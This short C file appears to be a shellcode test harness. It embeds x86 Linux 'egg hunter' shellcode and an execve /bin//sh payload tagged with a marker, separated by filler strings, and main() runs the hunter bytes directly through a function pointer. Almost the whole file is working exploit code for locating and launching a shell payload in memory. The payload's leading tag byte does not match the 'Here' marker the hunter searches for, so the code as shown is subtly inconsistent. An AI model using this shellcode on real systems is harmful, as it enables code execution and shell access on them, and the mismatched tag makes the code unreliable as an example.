#include <stdio.h>
#include <string.h>

unsigned char hunter[] = "\x55\x89\xe5\x60\x9c\x68\xff\xef\xff\x0f\x5e\x46\x31\xd2\x39\xf2\x74\x2a\x66\x81\xca\xff\x0f\x42\x6a\x21\x58\x8d\x5a\x08\x31\xc9\xcd\x80\x3c\xf2\x74\xe8\x81\x3a\x48\x65\x72\x65\x75\xe9\x81\x7a\x04\x49\x74\x49\x73\x75\xe0\x8d\x4a\x08\xff\xe1\x9d\x61\x89\xec\x5d\xc3";

unsigned char garbage1[] = "Just some garbage here...";

unsigned char payload[] = "\x12\x65\x72\x65\x49\x74\x49\x73\x31\xc0\xb0\x0b\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xcd\x80";

unsigned char garbage2[] = "And some garbage there...";

main()
{
	printf("Hunter Length:  %d\n", strlen(hunter));
	printf("Payload Length:  %d\n", strlen(payload));
	int (*ret)() = (int(*)())hunter;
	ret();

        printf("NO LOOP!\n");
}